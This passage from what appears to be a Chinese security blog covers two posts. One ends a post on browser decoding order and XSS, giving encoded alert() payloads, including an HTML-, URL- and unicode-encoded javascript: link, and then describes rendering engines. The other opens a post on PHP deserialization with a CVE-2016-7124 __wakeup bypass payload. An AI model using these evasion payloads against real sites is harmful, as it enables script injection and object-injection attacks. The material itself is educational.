<p>12&#x3001;<br></p><figure class="highlight html hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>\u0061\u006c\u0065\u0072\u0074(\u0031\u0032)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><br>&#x4E0D;&#x5F39;&#x7A97;&#xFF0C; &#x5176;&#x5B9E;&#x4E2A;&#x4EBA;&#x6700;&#x5F00;&#x59CB;&#x770B;&#x5230;payload&#x662F;&#x611F;&#x89C9;&#x80FD;&#x5F39;&#x7A97;&#x7684;&#xFF0C;&#x540E;&#x6765;&#x53C2;&#x8003;&#x4E86;&#x522B;&#x4EBA;&#x7684;&#x601D;&#x8DEF;&#x3002;&#x53D1;&#x73B0;<code>\u0031\u0032</code>&#x5728;&#x89E3;&#x7801;&#x7684;&#x65F6;&#x5019;&#x4F1A;&#x88AB;&#x89E3;&#x7801;&#x4E3A;&#x5B57;&#x7B26;&#x4E32;12&#x3002;&#x9700;&#x8981;&#x5F15;&#x53F7;&#x5305;&#x88F9;&#x3002;&#x56E0;&#x6B64;&#x4E0D;&#x6267;&#x884C;JS<p></p>
<p>13&#x3001;<br></p><figure class="highlight html hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(&apos;13\u0027)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><br>&#x4E0D;&#x5F39;&#x7A97;&#xFF0C;&#x539F;&#x56E0;&#x540C;8: &#x51FA;&#x73B0;&#x5355;&#x5F15;&#x53F7;&#x8FDB;&#x884C;&#x4E86;unicode&#x7F16;&#x7801;&#xFF0C;JS&#x65E0;&#x6CD5;&#x8BC6;&#x522B;&#x7F16;&#x7801;&#x540E;&#x7684;&#x63A7;&#x5236;&#x5B57;&#x7B26;<p></p>
<p>14&#x3001;<br></p><figure class="highlight html hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="hljs-actionscript">alert(<span class="hljs-string">&apos;14\u000a&apos;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><br>&#x5F39;&#x7A97;&#x3002;&#x539F;&#x56E0;: <code>\u000a</code>&#x5728;JavaScript&#x91CC;&#x662F;&#x6362;&#x884C;&#xFF0C;&#x5C31;&#x662F;<code>\n</code>&#xFF0C;&#x76F4;&#x63A5;&#x6267;&#x884C;<p></p>
<p>&#x7EC4;&#x5408;&#x62F3;:<br></p><figure class="highlight html hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x31;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x36;&amp;#x33;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x35;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x32;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x34;&amp;#x28;&amp;#x31;&amp;#x35;&amp;#x29;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x5148;&#x8FDB;&#x884C;HTML&#x89E3;&#x7801;&#x5F97;<br></p><figure class="highlight html hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(15)&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><br>&#x7136;&#x540E;&#x8FDB;&#x5165; URL &#x6A21;&#x5757;&#x5904;&#x7406;&#xFF0C;&#x53D1;&#x73B0;&#x5B8C;&#x6574; <code>javascript:</code> &#x534F;&#x8BAE;&#xFF0C;&#x8FDB;&#x884C;URL&#x89E3;&#x7801;&#x3002;&#x5F97;<code>javascript:\u0061\u006c\u0065\u0072\u0074(15)</code><br>&#x63A7;&#x5236;&#x5B57;&#x7B26; <code>()</code>&#x672A;&#x88AB;unicode&#x7F16;&#x7801;&#xFF0C;&#x56E0;&#x6B64;&#x8FDB;&#x884C; JavaScript &#x89E3;&#x7801;&#xFF0C;&#x6210;&#x529F;&#x5F39;&#x7A97;<p></p>
<h2 id="&#x6D4F;&#x89C8;&#x5668;&#x6E32;&#x67D3;"><a href="#&#x6D4F;&#x89C8;&#x5668;&#x6E32;&#x67D3;" class="headerlink" title="&#x6D4F;&#x89C8;&#x5668;&#x6E32;&#x67D3;"></a>&#x6D4F;&#x89C8;&#x5668;&#x6E32;&#x67D3;</h2><h3 id="&#x6D4F;&#x89C8;&#x5668;&#x7684;&#x5448;&#x73B0;&#x5F15;&#x64CE;"><a href="#&#x6D4F;&#x89C8;&#x5668;&#x7684;&#x5448;&#x73B0;&#x5F15;&#x64CE;" class="headerlink" title="&#x6D4F;&#x89C8;&#x5668;&#x7684;&#x5448;&#x73B0;&#x5F15;&#x64CE;"></a>&#x6D4F;&#x89C8;&#x5668;&#x7684;&#x5448;&#x73B0;&#x5F15;&#x64CE;</h3><p>&#x5448;&#x73B0;&#x5F15;&#x64CE;&#x9ED8;&#x8BA4;&#x53EF;&#x4EE5;&#x89E3;&#x6790;html&#x6587;&#x6863;&#x3001;xml&#x6587;&#x6863;&#x4EE5;&#x53CA;&#x56FE;&#x7247;&#x7B49;&#x8D44;&#x6E90;&#x5E76;&#x5C06;&#x89E3;&#x6790;&#x540E;&#x7684;&#x5185;&#x5BB9;&#x5C55;&#x793A;&#x7ED9;&#x7528;&#x6237;&#x3002;&#x901A;&#x8FC7;&#x5404;&#x79CD;&#x63D2;&#x4EF6;&#xFF08;&#x6D4F;&#x89C8;&#x5668;&#x6269;&#x5C55;&#x7A0B;&#x5E8F;&#xFF09;&#x6D4F;&#x89C8;&#x5668;&#x8FD8;&#x53EF;&#x4EE5;&#x5C55;&#x793A;&#x5176;&#x4ED6;&#x5404;&#x7C7B;&#x578B;&#x7684;web&#x8D44;&#x6E90;&#xFF0C;&#x5982;pdf&#x63D2;&#x4EF6;&#x53EF;&#x4EE5;&#x8BA9;&#x6D4F;&#x89C8;&#x5668;&#x5C55;&#x793A;pdf&#x6587;&#x6863;&#x3002;&#x4E0D;&#x540C;&#x6D4F;&#x89C8;&#x5668;&#x4F7F;&#x7528;&#x7684;&#x5448;&#x73B0;&#x5F15;&#x64CE;&#x4E5F;&#x4E0D;&#x4E00;&#x6837;&#xFF0C;&#x76EE;&#x524D;&#x4E3B;&#x6D41;&#x7684;&#x5448;&#x73B0;&#x5F15;&#x64CE;&#x6709;Webkit&#x3001;Blink(Webkit&#x7684;&#x4E00;&#x4E2A;&#x5206;&#x652F;)&#x3001;Gecko&#x3001;Trident&#x3001;EdgeHTML(Trident&#x7684;&#x4E00;&#x4E2A;&#x5206;&#x652F;)&#x3002;</p>
<table>
<thead>
<tr>
<th align="center">&#x6D4F;&#x89C8;&#x5668;</th>
<th align="center">&#x5448;&#x73B0;&#x5F15;&#x64CE;</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Chrome</td>
<td align="center">Blink&#xFF08;Chrome 28+&#xFF09;<br> Webkit&#xFF08;Chrome 27-&#xFF09;</td>
</tr>
<tr>
<td align="center">Safari</td>
<td align="center">Webkit</td>
</tr>
<tr>
<td align="center">Firefox</td>
<td align="center">Gecko</td>
</tr>
<tr>
<td align="center">Edge</td>
<td align="center">EdgeHTML</td>
</tr>
<tr>
<td align="center">IE</td>
<td align="center">Trident</td>
</tr>
</tbody></table>
<h3 id="&#x9875;&#x9762;&#x5448;&#x73B0;&#x539F;&#x7406;"><a href="#&#x9875;&#x9762;&#x5448;&#x73B0;&#x539F;&#x7406;" class="headerlink" title="&#x9875;&#x9762;&#x5448;&#x73B0;&#x539F;&#x7406;"></a>&#x9875;&#x9762;&#x5448;&#x73B0;&#x539F;&#x7406;</h3><p>&#x5F53;&#x6211;&#x4EEC;&#x70B9;&#x51FB;&#x4E00;&#x4E2A;&#x94FE;&#x63A5;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x5C06; HTML &#x4EE3;&#x7801;&#x4F20;&#x8F93;&#x5230;&#x6211;&#x4EEC;&#x7684;&#x6D4F;&#x89C8;&#x5668;&#xFF0C;&#x6D4F;&#x89C8;&#x5668;&#x5728;&#x63A5;&#x6536;&#x5230;&#x8FD9;&#x4EFD; HTML &#x4EE3;&#x7801;&#x4E4B;&#x540E;&#x8FDB;&#x884C;&#x7684;&#x9875;&#x9762;&#x7684;&#x5448;&#x73B0;&#xFF0C;&#x7C97;&#x7565;&#x7684;&#x8BF4;&#x4F1A;&#x7ECF;&#x8FC7;&#x4EE5;&#x4E0B;&#x8FD9;&#x4E9B;&#x6B65;&#x9AA4;&#xFF1A;</p>
<ol>
<li>DOM &#x6811;&#x7684;&#x6784;&#x5EFA;&#xFF08;Parse HTML&#xFF09;</li>
<li>&#x6784;&#x5EFA; CSSOM &#x6811;&#xFF08;Recaculate Style&#xFF09;</li>
<li>&#x5408;&#x5E76; DOM &#x6811;&#x4E0E; CSSOM &#x6811;&#x4E3A; Render &#x6811;</li>
<li>&#x5E03;&#x5C40;&#xFF08;Layout&#xFF09;</li>
<li>&#x7ED8;&#x5236;&#xFF08;Paint&#xFF09;</li>
<li>&#x590D;&#x5408;&#x56FE;&#x5C42;&#x5316;&#xFF08;Composite&#xFF09;</li>
</ol>
<p>&#x9875;&#x9762;&#x5448;&#x73B0;&#x8FC7;&#x7A0B;&#x4E2D;&#x7684;&#x963B;&#x585E;</p>
<ol>
<li>&#x5F53;&#x9047;&#x5230; JavaScript &#x811A;&#x672C;&#x6216;&#x8005;&#x5916;&#x90E8; JavaScript &#x4EE3;&#x7801;&#x65F6;&#xFF0C;&#x6D4F;&#x89C8;&#x5668;&#x4FBF;&#x505C;&#x6B62; DOM &#x7684;&#x6784;&#x5EFA;&#xFF08;&#x963B;&#x585E; 1&#xFF09;</li>
<li>&#x5F53;&#x9047;&#x5230; <code>&lt;script&gt;</code> &#x6807;&#x7B7E;&#x9700;&#x8981;&#x6267;&#x884C;&#x811A;&#x672C;&#x4EE3;&#x7801;&#x65F6;&#xFF0C;&#x6D4F;&#x89C8;&#x5668;&#x4F1A;&#x68C0;&#x67E5;&#x662F;&#x5426;&#x8FD9;&#x4E2A; <code>&lt;script&gt;</code> &#x6807;&#x7B7E;&#x4EE5;&#x4E0A;&#x7684; CSS &#x6587;&#x4EF6;&#x662F;&#x5426;&#x5DF2;&#x7ECF;&#x52A0;&#x8F7D;&#x5E76;&#x7528;&#x4E8E;&#x6784;&#x5EFA;&#x4E86; CSSOM&#xFF0C;&#x5982;&#x679C; <code>&lt;script&gt;</code> &#x4E0A;&#x90E8;&#x8FD8;&#x6709; CSS &#x6837;&#x5F0F;&#x6CA1;&#x52A0;&#x8F7D;&#xFF0C;&#x5219;&#x6D4F;&#x89C8;&#x5668;&#x4F1A;&#x7B49;&#x5F85; <code>&lt;script&gt;</code> &#x4E0A;&#x65B9;&#x6837;&#x5F0F;&#x7684;&#x52A0;&#x8F7D;&#x5B8C;&#x6210;&#x624D;&#x4F1A;&#x6267;&#x884C;&#x8BE5; <code>&lt;script&gt;</code> &#x5185;&#x7684;&#x811A;&#x672C;&#xFF08;&#x963B;&#x585E; 2&#xFF09;</li>
<li>DOM &#x6811;&#x4E0E; CSSOM &#x6811;&#x7684;&#x6210;&#x529F;&#x6784;&#x5EFA;&#x662F;&#x540E;&#x9762;&#x6B65;&#x9AA4;&#x7684;&#x6839;&#x57FA;&#xFF08;&#x540C;&#x6B65;&#x963B;&#x585E;&#xFF09;</li>
<li>&#x540C;&#x65F6;&#x5916;&#x90E8;&#x811A;&#x672C;&#x3001;&#x5916;&#x90E8;&#x6837;&#x5F0F;&#x8868;&#x7684;&#x4E0B;&#x8F7D;&#x4E5F;&#x662F;&#x8017;&#x8D39;&#x65F6;&#x95F4;&#x8F83;&#x591A;&#x7684;&#x70B9;</li>
</ol>
<h3 id="Webkit&#x548C;Gecko&#x7684;&#x6D41;&#x7A0B;&#x5BF9;&#x6BD4;"><a href="#Webkit&#x548C;Gecko&#x7684;&#x6D41;&#x7A0B;&#x5BF9;&#x6BD4;" class="headerlink" title="Webkit&#x548C;Gecko&#x7684;&#x6D41;&#x7A0B;&#x5BF9;&#x6BD4;"></a>Webkit&#x548C;Gecko&#x7684;&#x6D41;&#x7A0B;&#x5BF9;&#x6BD4;</h3><p>Webkit&#x7684;&#x4E3B;&#x8981;&#x6D41;&#x7A0B;&#xFF08;&#x56FE;&#x7247;&#x6458;&#x81EA;Tali Garsiel&#x7684;&#x7814;&#x7A76;&#x6210;&#x679C;)<br><img src="/2020/03/10/%E6%B5%8F%E8%A7%88%E5%99%A8%E8%A7%A3%E6%9E%90%E6%9C%BA%E5%88%B6%E4%B8%8E%E6%B8%B2%E6%9F%93%E8%BF%87%E7%A8%8B/image-20201113201822991.png" alt="image-20201113201822991"></p>
<p>Gecko&#x7684;&#x4E3B;&#x8981;&#x6D41;&#x7A0B;&#xFF08;&#x56FE;&#x7247;&#x6458;&#x81EA;Tali Garsiel&#x7684;&#x7814;&#x7A76;&#x6210;&#x679C;&#xFF09;<br><img src="/2020/03/10/%E6%B5%8F%E8%A7%88%E5%99%A8%E8%A7%A3%E6%9E%90%E6%9C%BA%E5%88%B6%E4%B8%8E%E6%B8%B2%E6%9F%93%E8%BF%87%E7%A8%8B/image-20201113201829531.png" alt="image-20201113201829531"></p>
<h2 id="&#x53C2;&#x8003;&#x94FE;&#x63A5;"><a href="#&#x53C2;&#x8003;&#x94FE;&#x63A5;" class="headerlink" title="&#x53C2;&#x8003;&#x94FE;&#x63A5;"></a>&#x53C2;&#x8003;&#x94FE;&#x63A5;</h2><p><a href="https://lihuaiqiu.github.io/2020/02/14/%E4%BB%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E4%B8%8E%E8%A7%A3%E7%A0%81%E5%8E%9F%E7%90%86%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86xss/#more" target="_blank" rel="noopener">&#x4ECE;&#x6D4F;&#x89C8;&#x5668;&#x6E32;&#x67D3;&#x4E0E;&#x89E3;&#x7801;&#x539F;&#x7406;&#x91CD;&#x65B0;&#x8BA4;&#x8BC6;xss</a><br><a href="https://xz.aliyun.com/t/5863#toc-4" target="_blank" rel="noopener">&#x6D4F;&#x89C8;&#x5668;&#x89E3;&#x7801;&#x770B;XSS</a><br><a href="http://bobao.360.cn/learning/detail/292.html" target="_blank" rel="noopener">&#x6DF1;&#x5165;&#x7406;&#x89E3;&#x6D4F;&#x89C8;&#x5668;&#x89E3;&#x6790;&#x673A;&#x5236;&#x548C;XSS&#x5411;&#x91CF;&#x7F16;&#x7801;</a><br><a href="https://www.html5rocks.com/zh/tutorials/internals/howbrowserswork/#The_browsers_we_will_talk_about" target="_blank" rel="noopener">&#x6D4F;&#x89C8;&#x5668;&#x7684;&#x5DE5;&#x4F5C;&#x539F;&#x7406;&#xFF1A;&#x65B0;&#x5F0F;&#x7F51;&#x7EDC;&#x6D4F;&#x89C8;&#x5668;&#x5E55;&#x540E;&#x63ED;&#x79D8;</a><br><a href="https://www.zybuluo.com/yangfch3/note/671516" target="_blank" rel="noopener">&#x6D4F;&#x89C8;&#x5668;&#x5185;&#x6838;&#x3001;JS &#x5F15;&#x64CE;&#x3001;&#x9875;&#x9762;&#x5448;&#x73B0;&#x539F;&#x7406;&#x53CA;&#x5176;&#x4F18;&#x5316;</a><br><a href="https://zhuanlan.zhihu.com/p/24911872?refer=dreawer" target="_blank" rel="noopener">&#x4ECE;Chrome&#x6E90;&#x7801;&#x770B;&#x6D4F;&#x89C8;&#x5668;&#x5982;&#x4F55;&#x6784;&#x5EFA;DOM&#x6811;</a><br><a href="https://www.cnblogs.com/imwtr/p/4481092.html" target="_blank" rel="noopener">&#x4E0D;&#x540C;&#x5185;&#x6838;&#x6D4F;&#x89C8;&#x5668;&#x7684;&#x5DEE;&#x5F02;&#x4EE5;&#x53CA;&#x6D4F;&#x89C8;&#x5668;&#x6E32;&#x67D3;&#x7B80;&#x4ECB;</a></p>
</body></html>]]></content>
      <categories>
        <category>Web Sec</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>再谈 PHP 反序列化</title>
    <url>/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<html><head></head><body><p>&#x6587;&#x7AE0;&#x9996;&#x53D1;&#x4E8E; SECIN&#x793E;&#x533A;&#xFF1A;<a href="https://www.sec-in.com/article/137" target="_blank" rel="noopener">https://www.sec-in.com/article/137</a></p>
<a id="more"></a>



<h2 id="&#x4E09;&#x79CD;&#x7C7B;&#x5C5E;&#x6027;"><a href="#&#x4E09;&#x79CD;&#x7C7B;&#x5C5E;&#x6027;" class="headerlink" title="&#x4E09;&#x79CD;&#x7C7B;&#x5C5E;&#x6027;"></a>&#x4E09;&#x79CD;&#x7C7B;&#x5C5E;&#x6027;</h2><p><strong>Private &#x6743;&#x9650;: &#x6B63;&#x5E38;</strong><br><strong>Private &#x6743;&#x9650;&#x5C5E;&#x6027;&#x540D;: <code>%00&#x7C7B;&#x540D;%00&#x5C5E;&#x6027;&#x540D;</code> &#x3002;&#x4E14;&#x5C5E;&#x6027;&#x540D;&#x957F;&#x5EA6;&#x6539;&#x53D8;</strong><br><strong>Protected &#x6743;&#x9650;&#x5C5E;&#x6027;&#x540D;: <code>%00*%00&#x5C5E;&#x6027;&#x540D;</code> &#x3002;&#x4E14;&#x5C5E;&#x6027;&#x540D;&#x957F;&#x5EA6;&#x6539;&#x53D8;</strong></p>
<p>demo<br></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span>   </span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">public</span> $name = <span class="hljs-string">&apos;P2hm1n&apos;</span>;</span><br><span class="line">    <span class="hljs-keyword">private</span> $age = <span class="hljs-string">&apos;Secret&apos;</span>;</span><br><span class="line">    <span class="hljs-keyword">protected</span> $test = <span class="hljs-string">&apos;test&apos;</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">$test = <span class="hljs-keyword">new</span> Test;</span><br><span class="line">$content = serialize($test);</span><br><span class="line">file_put_contents(<span class="hljs-string">&apos;./flag.txt&apos;</span>, $content);</span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><br><img src="/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20201113201552674.png" alt><p></p>
<h2 id="&#x9B54;&#x672F;&#x65B9;&#x6CD5;"><a href="#&#x9B54;&#x672F;&#x65B9;&#x6CD5;" class="headerlink" title="&#x9B54;&#x672F;&#x65B9;&#x6CD5;"></a>&#x9B54;&#x672F;&#x65B9;&#x6CD5;</h2><p>&#x5177;&#x4F53;&#x53EF;&#x53C2;&#x8003;PHP&#x624B;&#x518C;: <a href="https://www.php.net/manual/zh/language.oop5.magic.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/language.oop5.magic.php</a></p>
<p><code>construct</code> &#x8C03;&#x7528;&#x6761;&#x4EF6; :&#x5F53;&#x4E00;&#x4E2A;&#x7C7B;&#x88AB;&#x521D;&#x59CB;&#x5316;&#x4E3A;&#x5B9E;&#x4F8B;&#x65F6;&#x4F1A;&#x8C03;&#x7528;(<code>unserialize()</code>&#x65F6;&#x4E0D;&#x4F1A;&#x81EA;&#x52A8;&#x8C03;&#x7528;)<br><code>destruct</code> &#x8C03;&#x7528;&#x6761;&#x4EF6; :&#x5F53;&#x5BF9;&#x8C61;&#x88AB;&#x9500;&#x6BC1;&#x65F6;&#x4F1A;&#x8C03;&#x7528;<br><code>sleep</code> &#x8C03;&#x7528;&#x6761;&#x4EF6; :&#x5F53;&#x4E00;&#x4E2A;&#x7C7B;&#x8C03;&#x7528;<code>serialize</code>&#x8FDB;&#x884C;&#x5E8F;&#x5217;&#x5316;&#x65F6;&#x4F1A;&#x81EA;&#x52A8;&#x8C03;&#x7528;<br><code>wakeup</code> &#x8C03;&#x7528;&#x6761;&#x4EF6; :&#x5F53;&#x5B57;&#x7B26;&#x4E32;&#x8981;&#x5229;&#x7528;<code>unserialize</code>&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6210;&#x4E00;&#x4E2A;&#x7C7B;&#x65F6;&#x4F1A;&#x8C03;&#x7528;<br><code>get()</code> &#x8C03;&#x7528;&#x6761;&#x4EF6;:&#x5F53;&#x4ECE;&#x4E0D;&#x53EF;&#x8BBF;&#x95EE;&#x7684;&#x5C5E;&#x6027;&#x8BFB;&#x53D6;&#x6570;&#x636E;<br><code>call()</code>&#x8C03;&#x7528;&#x6761;&#x4EF6;: &#x5F53;&#x8981;&#x8C03;&#x7528;&#x7684;&#x65B9;&#x6CD5;&#x4E0D;&#x5B58;&#x5728;&#x6216;&#x6743;&#x9650;&#x4E0D;&#x8DB3;&#x65F6;&#x81EA;&#x52A8;&#x8C03;&#x7528;<br><code>invoke()</code>&#x8C03;&#x7528;&#x6761;&#x4EF6;: &#x5F53;&#x628A;&#x4E00;&#x4E2A;&#x7C7B;&#x5F53;&#x4F5C;&#x51FD;&#x6570;&#x4F7F;&#x7528;&#x65F6;&#x81EA;&#x52A8;&#x8C03;&#x7528;</p>
<p><code>tostring</code> &#x5F53;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x540E;&#x7684;&#x5BF9;&#x8C61;&#x88AB;&#x5F53;&#x4F5C;&#x5B57;&#x7B26;&#x4E32;&#x7684;&#x65F6;&#x5019;&#x8C03;&#x7528;&#x3002;&#x5177;&#x4F53;&#x8C03;&#x7528;&#x573A;&#x666F;&#x6761;&#x4EF6;&#x5982;&#x4E0B;(&#x5F15;&#x7528;&#x81EA; @k0rz3n)</p>
<blockquote>
<p>(1) <code>echo ($obj) / print($obj)</code> &#x6253;&#x5370;&#x65F6;&#x4F1A;&#x89E6;&#x53D1;<br>(2) &#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5BF9;&#x8C61;&#x4E0E;&#x5B57;&#x7B26;&#x4E32;&#x8FDE;&#x63A5;&#x65F6;<br>(3) &#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5BF9;&#x8C61;&#x53C2;&#x4E0E;&#x683C;&#x5F0F;&#x5316;&#x5B57;&#x7B26;&#x4E32;&#x65F6;<br>(4) &#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5BF9;&#x8C61;&#x4E0E;&#x5B57;&#x7B26;&#x4E32;&#x8FDB;&#x884C;<code>==</code>&#x6BD4;&#x8F83;&#x65F6;&#xFF08;PHP&#x8FDB;&#x884C;<code>==</code>&#x6BD4;&#x8F83;&#x7684;&#x65F6;&#x5019;&#x4F1A;&#x8F6C;&#x6362;&#x53C2;&#x6570;&#x7C7B;&#x578B;&#xFF09;<br>(5) &#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5BF9;&#x8C61;&#x53C2;&#x4E0E;&#x683C;&#x5F0F;&#x5316;SQL&#x8BED;&#x53E5;&#xFF0C;&#x7ED1;&#x5B9A;&#x53C2;&#x6570;&#x65F6;<br>(6) &#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5BF9;&#x8C61;&#x5728;&#x7ECF;&#x8FC7;php&#x5B57;&#x7B26;&#x4E32;&#x51FD;&#x6570;&#xFF0C;&#x5982; <code>strlen()</code>&#x3001;<code>addslashes()</code>&#x65F6;<br>(7) &#x5728;<code>in_array()</code>&#x65B9;&#x6CD5;&#x4E2D;&#xFF0C;&#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x662F;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5BF9;&#x8C61;&#xFF0C;&#x7B2C;&#x4E8C;&#x4E2A;&#x53C2;&#x6570;&#x7684;&#x6570;&#x7EC4;&#x4E2D;&#x6709;<code>toString</code>&#x8FD4;&#x56DE;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x7684;&#x65F6;&#x5019;<code>toString</code>&#x4F1A;&#x88AB;&#x8C03;&#x7528;<br>(8) &#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x5BF9;&#x8C61;&#x4F5C;&#x4E3A; <code>class_exists()</code> &#x7684;&#x53C2;&#x6570;&#x7684;&#x65F6;&#x5019;</p>
</blockquote>
<h2 id="CVE-2016-7124"><a href="#CVE-2016-7124" class="headerlink" title="CVE-2016-7124"></a>CVE-2016-7124</h2><p>CVE&#x5229;&#x7528;&#x76EE;&#x7684;: &#x7ED5;&#x8FC7;&#x9B54;&#x6CD5;&#x51FD;&#x6570;<code>__wakeup</code></p>
<p><strong>&#x7248;&#x672C;&#x9650;&#x5236;: PHP5 &lt; 5.6.25 | PHP7 &lt; 7.0.10</strong></p>
<p>&#x6838;&#x5FC3;&#x539F;&#x7406;: <a href="https://paper.seebug.org/866/" target="_blank" rel="noopener">PHP &#x5185;&#x6838;&#x5C42;&#x89E3;&#x6790;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6F0F;&#x6D1E;</a><br>s<br>&#x7ED5;&#x8FC7;&#x65B9;&#x6CD5;: &#x5F53;&#x5E8F;&#x5217;&#x5316;&#x5B57;&#x7B26;&#x4E32;&#x4E2D;&#x8868;&#x793A;&#x5BF9;&#x8C61;&#x5C5E;&#x6027;&#x4E2A;&#x6570;&#x7684;&#x503C;&#x5927;&#x4E8E;&#x771F;&#x5B9E;&#x7684;&#x5C5E;&#x6027;&#x4E2A;&#x6570;&#x65F6;&#x4F1A;&#x8DF3;&#x8FC7;<code>__wakeup</code>&#x7684;&#x6267;&#x884C;</p>
<p>Bypass demo</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span>   </span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">public</span> $name = <span class="hljs-string">&apos;P2hm1n&apos;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function">    </span>{</span><br><span class="line">        <span class="hljs-keyword">echo</span> <span class="hljs-string">&apos;Bypass&apos;</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function">    </span>{</span><br><span class="line">        <span class="hljs-keyword">echo</span> <span class="hljs-string">&apos;fail &apos;</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">$payload = <span class="hljs-string">&apos;&apos;</span>;</span><br><span class="line">unserialize($payload);</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p>
<p>payload<br></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line">payload1 = O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Test&quot;</span>:<span class="hljs-number">1</span>:{s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;P2hm1n&quot;</span>;}</span><br><span class="line"><span class="hljs-comment">// fail Bypass</span></span><br></pre></td></tr></tbody></table></figure><p></p>
